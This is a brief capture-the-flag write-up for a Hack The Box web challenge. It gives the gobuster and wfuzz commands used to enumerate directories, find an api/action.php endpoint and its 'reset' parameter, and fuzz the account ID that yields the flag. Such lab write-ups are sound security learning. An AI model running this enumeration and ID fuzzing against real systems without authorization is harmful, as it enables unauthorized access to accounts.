# Before Cracking:

Run the instance:
![](./in1.png)

Go to instance:
![](./in2.png)

# Trials

-   Start with gobuster
    `gobuster -u http://docker.hackthebox.eu:30029/ -w /usr/share/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm`
    ![](./1.png)

    > find a directory named `api`

-   gobuster with `api`
    `gobuster -u http://docker.hackthebox.eu:30029/api/ -w /usr/share/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm`
    ![](./2.png)

    > get `action.php`

-   go to the action.php page
    ![](./3.png)

    > we need to find the parameters

-   use `wfuzz`
    `wfuzz --hh=24 -c -w /usr/share/dirb/wordlists/big.txt http://docker.hackthebox.eu:30029/api/action.php?FUZZ=test`
    ![](./4.png)

    > fing parameter `reset`

-   go to the `action.php` with `reset=test`
    ![](./5.png)

-   use `wfuzz` to find account ID
    `wfuzz --hh=24 -c -w /usr/share/dirb/wordlists/big.txt http://docker.hackthebox.eu:30029/api/action.php?reset=FUZZ`
    ![](./6.png)

    > get accountID: 20

-   go to the `action.php` with `reset=20`
    ![](./flag.png)

# Result

![](./sub.png)
